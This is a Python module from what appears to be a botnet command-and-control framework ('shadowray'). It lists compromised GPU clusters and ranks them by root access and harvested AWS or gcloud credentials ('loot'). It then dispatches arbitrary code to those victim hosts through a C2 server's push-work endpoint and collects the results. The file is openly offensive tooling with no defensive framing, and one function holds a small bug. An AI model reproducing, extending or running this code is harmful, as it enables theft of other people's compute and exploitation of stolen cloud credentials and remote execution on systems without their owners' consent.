#!/usr/bin/env python3
"""
Fleet Execution Pool — Convert enrolled clusters into dispatchable GPU fleet.
Any beacon = immediately usable compute.
Priority lanes:
- P0 root — whoami == root. Full file/persistence/credential access. Gets work first.
- P1 cloud-token — Env tokens (AKIA*, sk-*, etc.) or AWS credential files harvested. Tomorrow's elastic GPU pool.
- P2 standard — Everything else. Last priority.
"""
import json
import logging
import time
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Optional

from .config import load_config
from .ledger import Ledger

log = logging.getLogger("shadowray.fleet_pool")


class FleetPool:
    def __init__(self, config: Dict[str, Any] = None):
        self.cfg = config or load_config()
        self.ledger = Ledger("clusters.json")
        self.c2_url = self.cfg["c2_url"].rstrip("/")
        self.bearer = self.cfg["c2_bearer"]
    
    def _auth_headers(self) -> Dict[str, str]:
        return {"Content-Type": "application/json", "Authorization": f"Bearer {self.bearer}"}
    
    def _c2_get(self, path: str) -> Optional[Dict[str, Any]]:
        try:
            req = urllib.request.Request(
                f"{self.c2_url}{path}",
                headers=self._auth_headers()
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                return json.loads(r.read().decode())
        except Exception as e:
            log.debug("C2 GET %s failed: %s", path, e)
            return None
    
    def _c2_post(self, path: str, data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        try:
            req = urllib.request.Request(
                f"{self.c2_url}{path}",
                data=json.dumps(data).encode(),
                headers=self._auth_headers(),
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=15) as r:
                return json.loads(r.read().decode())
        except Exception as e:
            log.debug("C2 POST %s failed: %s", path, e)
            return None

    def gpus(self, only_root: bool = False, only_cloud: bool = False) -> List[Dict[str, Any]]:
        clusters = self.ledger.list_clusters(only_alive=True)
        clusters = [c for c in clusters if c.get("status") == "enrolled"]
        
        fleet = []
        for c in clusters:
            gpu_info = c.get("gpu_info", {})
            gpus = gpu_info.get("cluster", {}).get("GPU", 0)
            if gpus == 0:
                continue
            
            user = c.get("ident", {}).get("user", "")
            loot = c.get("loot", {})
            env_tokens = loot.get("env_tokens", {})
            files = loot.get("files", {})
            
            has_cloud_token = (
                any(k.startswith("AWS_") for k in env_tokens) or
                "aws_credentials" in files or
                "gcloud_creds" in files
            )
            is_root = user == "root"
            
            if only_root and not is_root:
                continue
            if only_cloud and not has_cloud_token:
                continue
            
            lane = "P0_root" if is_root else ("P1_cloud" if has_cloud_token else "P2_std")
            
            fleet.append({
                "host": c.get("ident", {}).get("host", c["ip"]),
                "ip": c["ip"],
                "port": c["port"],
                "gpus": gpus,
                "gpu_info": gpu_info.get("nvidia_smi", ""),
                "user": user,
                "lane": lane,
                "ips": c.get("ident", {}).get("ips", []),
                "tag": c.get("ident", {}).get("tag", "venom"),
            })
        
        lane_order = {"P0_root": 0, "P1_cloud": 1, "P2_std": 2}
        fleet.sort(key=lambda x: (lane_order.get(x["lane"], 3), -x["gpus"]))
        return fleet

    def gpu_summary(self) -> Dict[str, Any]:
        fleet = self.gpus()
        by_lane = {}
        total_gpus = 0
        for f in fleet:
            lane = f["lane"]
            by_lane[lane] = by_lane.get(lane, 0) + f["gpus"]
            total_gpus += f["gpus"]
        
        return {
            "total_reachable_gpus": total_gpus,
            "by_lane": by_lane,
            "hosts": len(fleet),
            "top_hosts": fleet[:10],
        }

    def launch(self, py_file: str, n_gpus: int = 0, timeout: int = 86400) -> Dict[str, Any]:
        code = Path(py_file).read_text()
        fleet = self.gpus()
        
        if n_gpus > 0:
            selected = []
            budget = n_gpus
            for f in fleet:
                if budget <= 0:
                    break
                take = min(f["gpus"], budget)
                selected.append((f, take))
                budget -= take
        else:
            selected = [(f, f["gpus"]) for f in fleet]
        
        if not selected:
            return {"error": "no GPU hosts available", "fleet": fleet}
        
        work_ids = []
        for host_info, gpu_count in selected:
            spec = {
                "work": {
                    "id": f"w-{int(time.time())}-{host_info['ip']}",
                    "code": code,
                    "timeout": timeout,
                    "target_gpus": gpu_count,
                }
            }
            spec["target_host"] = host_info["ip"]
            
            result = self._c2_post("/admin/push-work", spec)
            if result and result.get("ok"):
                work_ids.append(spec["work"]["id"])
                log.info("Dispatched work %s to %s (%d GPUs)", spec["work"]["id"], host_info["ip"], gpu_count)
            else:
                log.warning("Failed to dispatch to %s: %s", host_info["ip"], result)
        
        return {
            "dispatched": len(work_ids),
            "work_ids": work_ids,
            "total_gpus_allocated": sum(g for _, g in selected),
            "hosts": [f"{h['ip']}:{g}" for h, g in selected],
        }

    def launch_replicated(self, py_file: str, replicas: int = 8, timeout: int = 86400) -> Dict[str, Any]:
        code = Path(py_file).read_text()
        fleet = self.gpus()
        
        if not fleet:
            return {"error": "no GPU hosts available"}
        
        work_ids = []
        for i in range(replicas):
            host_info = fleet[i % len(fleet)]
            spec = {
                "work": {
                    "id": f"w-{int(time.time())}-rep{i}-{host_info['ip']}",
                    "code": code,
                    "timeout": timeout,
                },
                "target_host": host_info["ip"],
            }
            result = self._c2_post("/admin/push-work", spec)
            if result and result.get("ok"):
                work_ids.append(spec["work"]["id"])
        
        return {
            "replicas_requested": replicas,
            "replicas_dispatched": len(work_ids),
            "work_ids": work_ids,
            "hosts_used": len(set(w["target_host"] for w in work_ids)),
        }

    def results(self, since: int = 0) -> List[Dict[str, Any]]:
        out = []
        results_dir = Path("c2_loot/results")
        if not results_dir.exists():
            return out
        
        for f in sorted(results_dir.glob("*.json")):
            try:
                mtime = f.stat().st_mtime
                if mtime >= since:
                    out.append(json.loads(f.read_text()))
            except Exception:
                pass
        return out


def main():
    import sys
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
    
    pool = FleetPool()
    
    if len(sys.argv) < 2:
        print("Usage: python fleet_pool.py [gpus|summary|launch|replicas] [args...]")
        return
    
    cmd = sys.argv[1]
    
    if cmd == "gpus":
        only_root = "--root" in sys.argv
        only_cloud = "--cloud" in sys.argv
        fleet = pool.gpus(only_root=only_root, only_cloud=only_cloud)
        print(json.dumps(fleet, indent=2))
    elif cmd == "summary":
        print(json.dumps(pool.gpu_summary(), indent=2))
    elif cmd == "launch":
        py_file = sys.argv[2] if len(sys.argv) > 2 else "examples/work_gpu_bench.py"
        n_gpus = int(sys.argv[3]) if len(sys.argv) > 3 else 0
        print(json.dumps(pool.launch(py_file, n_gpus), indent=2))
    elif cmd == "replicas":
        py_file = sys.argv[2] if len(sys.argv) > 2 else "examples/work_gpu_bench.py"
        replicas = int(sys.argv[3]) if len(sys.argv) > 3 else 8
        print(json.dumps(pool.launch_replicated(py_file, replicas), indent=2))
    elif cmd == "results":
        since = int(sys.argv[2]) if len(sys.argv) > 2 else 0
        print(json.dumps(pool.results(since), indent=2))
    else:
        print(f"Unknown command: {cmd}")


if __name__ == "__main__":
    main()
